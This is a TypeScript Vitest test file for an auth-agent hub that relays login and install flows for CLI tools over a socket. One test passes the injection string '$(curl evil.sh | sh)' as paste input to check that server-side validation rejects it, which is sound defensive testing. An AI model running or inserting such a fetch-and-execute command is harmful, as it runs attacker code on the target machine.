import { describe, it, expect, vi, beforeEach } from 'vitest'
import { createAuthAgentHub, parseAgentViewMsg, type AgentOp } from '@/server/auth-agent'
import { ServerError } from '@/server/errors'
import type { ToolLoginView } from '@/shared/types'

function fakeSocket(): {
  sent: AgentOp[]
  sock: { send: (d: string) => void; close: (code?: number, reason?: string) => void }
  close: ReturnType<typeof vi.fn>
} {
  const sent: AgentOp[] = []
  const close = vi.fn()
  return {
    sent,
    close,
    sock: {
      send: (d: string) => sent.push(JSON.parse(d) as AgentOp),
      close: (code?: number, reason?: string) => { close(code, reason) },
    },
  }
}

function view(id: string, status: ToolLoginView['status'], extra: Partial<ToolLoginView> = {}): ToolLoginView {
  return { id, tool: 'claude', status, output: '', ...extra }
}

describe('createAuthAgentHub', () => {
  let hub: ReturnType<typeof createAuthAgentHub>

  beforeEach(() => {
    hub = createAuthAgentHub()
  })

  it('rejects a start with AUTH_AGENT_DISCONNECTED when no agent is connected', () => {
    expect(hub.connected()).toBe(false)
    try {
      hub.startLogin('claude')
      expect.unreachable('started without an agent')
    } catch (err) {
      expect(err).toBeInstanceOf(ServerError)
      expect((err as ServerError).code).toBe('AUTH_AGENT_DISCONNECTED')
      expect((err as ServerError).message).toMatch(/yaac auth (update|server start)/)
    }
  })

  it('start mints an id, returns a running view, and sends the op', () => {
    const { sent, sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')
    expect(v.status).toBe('running')
    expect(sent).toEqual([{ op: 'start', id: v.id, kind: 'login', tool: 'claude' }])
    expect(hub.getLogin(v.id).status).toBe('running')
  })

  it('ingests view pushes only for ids it minted, matching kind', () => {
    const { sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')

    hub.ingest(JSON.stringify({ op: 'view', kind: 'login', view: view(v.id, 'running', { output: 'open https://…' }) }))
    expect(hub.getLogin(v.id).output).toBe('open https://…')

    // Unknown id: dropped.
    hub.ingest(JSON.stringify({ op: 'view', kind: 'login', view: view('not-minted', 'success') }))
    expect(() => hub.getLogin('not-minted')).toThrow(/No sign-in session/)

    // Kind mismatch: dropped.
    hub.ingest(JSON.stringify({ op: 'view', kind: 'install', view: view(v.id, 'success') }))
    expect(hub.getLogin(v.id).status).toBe('running')

    hub.ingest(JSON.stringify({ op: 'view', kind: 'login', view: view(v.id, 'success') }))
    expect(hub.getLogin(v.id).status).toBe('success')
    hub.clearForTests()
  })

  it('validates paste input server-side and forwards clean codes', () => {
    const { sent, sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')

    expect(() => hub.sendLoginInput(v.id, '$(curl evil.sh | sh)')).toThrow(ServerError)
    hub.sendLoginInput(v.id, '  abc#DEF_123-  ')
    expect(sent.at(-1)).toEqual({ op: 'input', id: v.id, text: 'abc#DEF_123-' })
  })

  it('rejects input once the flow is terminal', () => {
    const { sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')
    hub.ingest(JSON.stringify({ op: 'view', kind: 'login', view: view(v.id, 'error') }))
    try {
      hub.sendLoginInput(v.id, 'abc')
      expect.unreachable('accepted input on a terminal flow')
    } catch (err) {
      expect((err as ServerError).code).toBe('CONFLICT')
    }
    hub.clearForTests()
  })

  it('cancel forgets the flow and tells the agent', () => {
    const { sent, sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')
    hub.cancelLogin(v.id)
    expect(sent.at(-1)).toEqual({ op: 'cancel', id: v.id, kind: 'login' })
    expect(() => hub.getLogin(v.id)).toThrow(/No sign-in session/)
    // Unknown ids are a no-op.
    hub.cancelLogin('ghost')
  })

  it('disconnect fails running flows and flips connected()', () => {
    const { sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startLogin('claude')
    expect(hub.connected()).toBe(true)

    hub.handleDisconnect(sock)
    expect(hub.connected()).toBe(false)
    const after = hub.getLogin(v.id)
    expect(after.status).toBe('error')
    expect(after.error).toMatch(/disconnected/)
    hub.clearForTests()
  })

  it('a stale connection cannot disconnect its replacement', () => {
    const a = fakeSocket()
    const b = fakeSocket()
    hub.setSocket(a.sock)
    hub.setSocket(b.sock)
    expect(a.close).toHaveBeenCalled() // old one closed on replace
    hub.handleDisconnect(a.sock)
    expect(hub.connected()).toBe(true)
  })

  it('handles the install kind with the same shapes', () => {
    const { sent, sock } = fakeSocket()
    hub.setSocket(sock)
    const v = hub.startInstall('codex')
    expect(sent.at(-1)).toEqual({ op: 'start', id: v.id, kind: 'install', tool: 'codex' })
    hub.ingest(JSON.stringify({ op: 'view', kind: 'install', view: view(v.id, 'success') }))
    expect(hub.getInstall(v.id).status).toBe('success')
    expect(() => hub.getLogin(v.id)).toThrow(/No sign-in session/)
    hub.clearForTests()
  })
})

describe('parseAgentViewMsg', () => {
  it('accepts well-formed view pushes and rejects everything else', () => {
    const ok = parseAgentViewMsg(JSON.stringify({ op: 'view', kind: 'login', view: view('x', 'running') }))
    expect(ok?.view.id).toBe('x')
    expect(parseAgentViewMsg('not json')).toBeNull()
    expect(parseAgentViewMsg(JSON.stringify({ op: 'start', kind: 'login' }))).toBeNull()
    expect(parseAgentViewMsg(JSON.stringify({ op: 'view', kind: 'nope', view: view('x', 'running') }))).toBeNull()
    expect(parseAgentViewMsg(JSON.stringify({ op: 'view', kind: 'login', view: { id: 1 } }))).toBeNull()
    expect(parseAgentViewMsg(JSON.stringify({ op: 'view', kind: 'login', view: view('x', 'weird' as never) }))).toBeNull()
  })
})
